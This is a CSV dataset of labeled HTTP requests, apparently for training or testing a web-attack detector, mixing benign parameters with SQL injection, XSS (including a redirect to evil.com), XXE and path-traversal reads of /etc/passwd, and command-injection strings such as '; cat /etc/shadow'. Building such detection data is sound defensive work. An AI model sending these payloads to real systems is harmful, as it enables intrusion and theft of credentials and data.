attack_type,payload,endpoint,http_method,request_body,source_ip
rce,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.141
normal,product=1,/rest/user/login,POST,product=1,192.168.1.106
normal,search=apple,/rest/basket,POST,search=apple,192.168.1.14
normal,sort=price,/redirect,POST,sort=price,192.168.1.177
sqli,"' UNION SELECT username, password FROM Users--",/#/search,GET,"' UNION SELECT username, password FROM Users--",192.168.1.145
normal,page=1,/rest/user/login,POST,page=1,192.168.1.163
normal,category=juice,/rest/user/login,GET,category=juice,192.168.1.131
normal,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.83
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.243
normal,category=juice,/profile,GET,category=juice,192.168.1.165
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.138
normal,sort=price,/rest/user/login,GET,sort=price,192.168.1.216
rce,; cat /etc/shadow,/rest/admin/application-configuration,POST,; cat /etc/shadow,192.168.1.32
xss,<img src=x onerror=alert(1)>,/rest/user/login,GET,<img src=x onerror=alert(1)>,192.168.1.144
normal,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.164
sqli,"' UNION SELECT username, password FROM Users--",/ftp,POST,"' UNION SELECT username, password FROM Users--",192.168.1.168
normal,sort=price,/rest/user/login,GET,sort=price,192.168.1.173
lfi,../../../../etc/passwd,/redirect,GET,../../../../etc/passwd,192.168.1.201
xss,<img src=x onerror=alert(1)>,/redirect,POST,<img src=x onerror=alert(1)>,192.168.1.204
normal,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.105
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.114
rce,; cat /etc/shadow,/redirect,POST,; cat /etc/shadow,192.168.1.19
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.155
normal,email=user@test.com,/rest/basket,POST,email=user@test.com,192.168.1.238
sqli,' OR '1'='1' --,/rest/user/login,GET,' OR '1'='1' --,192.168.1.244
normal,product=1,/ftp,POST,product=1,192.168.1.190
rce,| ls -la /,/rest/user/login,POST,| ls -la /,192.168.1.22
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.165
rce,| ls -la /,/redirect,POST,| ls -la /,192.168.1.94
normal,sort=price,/redirect,GET,sort=price,192.168.1.52
normal,sort=price,/profile,GET,sort=price,192.168.1.117
normal,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.67
normal,category=juice,/api/Products,POST,category=juice,192.168.1.56
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.204
normal,product=1,/redirect,GET,product=1,192.168.1.38
normal,page=1,/profile,POST,page=1,192.168.1.144
normal,page=1,/profile,POST,page=1,192.168.1.51
xss,<script>document.location='http://evil.com'</script>,/rest/basket,GET,<script>document.location='http://evil.com'</script>,192.168.1.61
normal,product=1,/redirect,GET,product=1,192.168.1.50
normal,product=1,/api/Products,GET,product=1,192.168.1.41
normal,page=1,/rest/basket,GET,page=1,192.168.1.173
normal,product=1,/#/search,GET,product=1,192.168.1.86
normal,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.20
normal,page=1,/rest/basket,GET,page=1,192.168.1.26
normal,sort=price,/profile,POST,sort=price,192.168.1.107
normal,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.90
lfi,../../../../etc/passwd,/rest/user/login,GET,../../../../etc/passwd,192.168.1.4
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.26
normal,page=1,/profile,POST,page=1,192.168.1.8
normal,product=1,/ftp,GET,product=1,192.168.1.157
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.77
sqli,' OR '1'='1' --,/ftp,POST,' OR '1'='1' --,192.168.1.71
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.129
normal,page=1,/redirect,POST,page=1,192.168.1.183
normal,sort=price,/api/Products,POST,sort=price,192.168.1.128
rce,| ls -la /,/rest/admin/application-configuration,GET,| ls -la /,192.168.1.61
normal,search=apple,/rest/user/login,POST,search=apple,192.168.1.14
normal,search=apple,/rest/basket,GET,search=apple,192.168.1.44
normal,category=juice,/ftp,POST,category=juice,192.168.1.156
xss,<script>document.location='http://evil.com'</script>,/redirect,POST,<script>document.location='http://evil.com'</script>,192.168.1.154
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/api/Products,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.140
normal,product=1,/profile,POST,product=1,192.168.1.139
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.144
normal,search=apple,/redirect,GET,search=apple,192.168.1.156
normal,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.249
normal,product=1,/#/search,GET,product=1,192.168.1.32
normal,product=1,/profile,POST,product=1,192.168.1.91
normal,product=1,/rest/basket,GET,product=1,192.168.1.232
xss,<img src=x onerror=alert(1)>,/rest/user/login,GET,<img src=x onerror=alert(1)>,192.168.1.159
normal,product=1,/#/search,POST,product=1,192.168.1.154
rce,| ls -la /,/rest/basket,GET,| ls -la /,192.168.1.162
normal,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.45
normal,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.229
normal,category=juice,/rest/user/login,GET,category=juice,192.168.1.13
normal,product=1,/#/search,POST,product=1,192.168.1.145
rce,; cat /etc/shadow,/rest/user/login,POST,; cat /etc/shadow,192.168.1.129
normal,product=1,/rest/user/login,GET,product=1,192.168.1.193
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.169
sqli,"' UNION SELECT username, password FROM Users--",/#/search,GET,"' UNION SELECT username, password FROM Users--",192.168.1.186
sqli,"' UNION SELECT username, password FROM Users--",/#/search,POST,"' UNION SELECT username, password FROM Users--",192.168.1.240
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/basket,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.174
sqli,' OR '1'='1' --,/rest/admin/application-configuration,GET,' OR '1'='1' --,192.168.1.61
normal,search=apple,/api/Products,GET,search=apple,192.168.1.225
xss,<script>document.location='http://evil.com'</script>,/rest/basket,POST,<script>document.location='http://evil.com'</script>,192.168.1.173
rce,; cat /etc/shadow,/rest/user/login,POST,; cat /etc/shadow,192.168.1.210
normal,search=apple,/api/Products,GET,search=apple,192.168.1.160
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.169
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/redirect,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.198
normal,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.106
normal,product=1,/#/search,POST,product=1,192.168.1.43
normal,sort=price,/redirect,POST,sort=price,192.168.1.253
normal,category=juice,/profile,GET,category=juice,192.168.1.249
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/user/login,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.19
normal,product=1,/rest/admin/application-configuration,GET,product=1,192.168.1.6
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.176
normal,page=1,/rest/user/login,GET,page=1,192.168.1.82
xss,<script>document.location='http://evil.com'</script>,/profile,GET,<script>document.location='http://evil.com'</script>,192.168.1.16
rce,; cat /etc/shadow,/profile,GET,; cat /etc/shadow,192.168.1.88
normal,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.124
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.204
xss,<img src=x onerror=alert(1)>,/redirect,POST,<img src=x onerror=alert(1)>,192.168.1.170
normal,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.81
normal,sort=price,/profile,GET,sort=price,192.168.1.11
xss,<img src=x onerror=alert(1)>,/api/Products,GET,<img src=x onerror=alert(1)>,192.168.1.120
rce,; cat /etc/shadow,/rest/admin/application-configuration,POST,; cat /etc/shadow,192.168.1.67
xss,<img src=x onerror=alert(1)>,/rest/basket,GET,<img src=x onerror=alert(1)>,192.168.1.102
normal,sort=price,/ftp,GET,sort=price,192.168.1.218
normal,category=juice,/ftp,GET,category=juice,192.168.1.134
rce,| ls -la /,/rest/admin/application-configuration,POST,| ls -la /,192.168.1.151
normal,product=1,/rest/user/login,GET,product=1,192.168.1.30
normal,product=1,/rest/admin/application-configuration,POST,product=1,192.168.1.89
rce,| ls -la /,/#/search,GET,| ls -la /,192.168.1.174
sqli,' OR '1'='1' --,/ftp,POST,' OR '1'='1' --,192.168.1.32
normal,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.185
normal,category=juice,/ftp,GET,category=juice,192.168.1.116
normal,email=user@test.com,/api/Products,POST,email=user@test.com,192.168.1.189
sqli,' OR '1'='1' --,/rest/admin/application-configuration,GET,' OR '1'='1' --,192.168.1.58
xss,<script>document.location='http://evil.com'</script>,/redirect,GET,<script>document.location='http://evil.com'</script>,192.168.1.77
normal,search=apple,/ftp,POST,search=apple,192.168.1.37
sqli,' OR '1'='1' --,/api/Products,POST,' OR '1'='1' --,192.168.1.119
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/api/Products,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.69
normal,product=1,/rest/basket,GET,product=1,192.168.1.60
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.118
normal,email=user@test.com,/rest/basket,POST,email=user@test.com,192.168.1.197
normal,page=1,/rest/basket,POST,page=1,192.168.1.124
rce,; cat /etc/shadow,/ftp,GET,; cat /etc/shadow,192.168.1.253
normal,category=juice,/ftp,POST,category=juice,192.168.1.79
normal,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.191
xss,<script>document.location='http://evil.com'</script>,/rest/user/login,GET,<script>document.location='http://evil.com'</script>,192.168.1.221
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,GET,"' UNION SELECT username, password FROM Users--",192.168.1.182
normal,search=apple,/api/Products,POST,search=apple,192.168.1.4
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.79
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/redirect,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.139
normal,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.187
xss,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,POST,<script>document.location='http://evil.com'</script>,192.168.1.11
normal,email=user@test.com,/api/Products,POST,email=user@test.com,192.168.1.55
rce,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.232
xss,<script>document.location='http://evil.com'</script>,/api/Products,POST,<script>document.location='http://evil.com'</script>,192.168.1.64
normal,category=juice,/rest/basket,GET,category=juice,192.168.1.174
normal,page=1,/rest/user/login,POST,page=1,192.168.1.239
normal,search=apple,/#/search,POST,search=apple,192.168.1.248
normal,category=juice,/#/search,GET,category=juice,192.168.1.10
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.226
normal,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.175
normal,page=1,/ftp,POST,page=1,192.168.1.93
sqli,' OR '1'='1' --,/api/Products,POST,' OR '1'='1' --,192.168.1.138
normal,product=1,/rest/basket,POST,product=1,192.168.1.20
normal,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.107
normal,search=apple,/rest/user/login,POST,search=apple,192.168.1.89
normal,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.78
normal,sort=price,/rest/user/login,POST,sort=price,192.168.1.120
normal,category=juice,/ftp,GET,category=juice,192.168.1.22
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.110
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.38
xss,<script>document.location='http://evil.com'</script>,/ftp,POST,<script>document.location='http://evil.com'</script>,192.168.1.156
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.163
normal,product=1,/ftp,POST,product=1,192.168.1.186
normal,search=apple,/ftp,GET,search=apple,192.168.1.222
normal,search=apple,/rest/admin/application-configuration,POST,search=apple,192.168.1.139
rce,; cat /etc/shadow,/rest/admin/application-configuration,POST,; cat /etc/shadow,192.168.1.24
xss,<script>document.location='http://evil.com'</script>,/rest/user/login,POST,<script>document.location='http://evil.com'</script>,192.168.1.217
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.163
xss,<script>document.location='http://evil.com'</script>,/api/Products,GET,<script>document.location='http://evil.com'</script>,192.168.1.244
sqli,"' UNION SELECT username, password FROM Users--",/ftp,POST,"' UNION SELECT username, password FROM Users--",192.168.1.254
normal,page=1,/ftp,POST,page=1,192.168.1.194
normal,sort=price,/ftp,POST,sort=price,192.168.1.186
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/api/Products,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.132
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.184
normal,page=1,/ftp,GET,page=1,192.168.1.157
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.165
sqli,' OR '1'='1' --,/profile,GET,' OR '1'='1' --,192.168.1.135
normal,sort=price,/#/search,POST,sort=price,192.168.1.146
normal,category=juice,/rest/user/login,POST,category=juice,192.168.1.240
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.56
normal,sort=price,/profile,POST,sort=price,192.168.1.172
xss,<script>document.location='http://evil.com'</script>,/redirect,GET,<script>document.location='http://evil.com'</script>,192.168.1.245
normal,category=juice,/rest/basket,POST,category=juice,192.168.1.153
normal,category=juice,/redirect,GET,category=juice,192.168.1.122
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.189
lfi,../../../../etc/passwd,/ftp,POST,../../../../etc/passwd,192.168.1.83
normal,email=user@test.com,/rest/basket,POST,email=user@test.com,192.168.1.131
normal,page=1,/rest/user/login,POST,page=1,192.168.1.188
normal,sort=price,/redirect,GET,sort=price,192.168.1.93
rce,| ls -la /,/rest/admin/application-configuration,POST,| ls -la /,192.168.1.46
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.10
rce,; cat /etc/shadow,/redirect,GET,; cat /etc/shadow,192.168.1.189
normal,category=juice,/api/Products,POST,category=juice,192.168.1.116
xss,<script>document.location='http://evil.com'</script>,/api/Products,GET,<script>document.location='http://evil.com'</script>,192.168.1.10
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/profile,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.52
normal,sort=price,/rest/basket,POST,sort=price,192.168.1.5
xss,<script>document.location='http://evil.com'</script>,/profile,GET,<script>document.location='http://evil.com'</script>,192.168.1.106
normal,page=1,/profile,GET,page=1,192.168.1.173
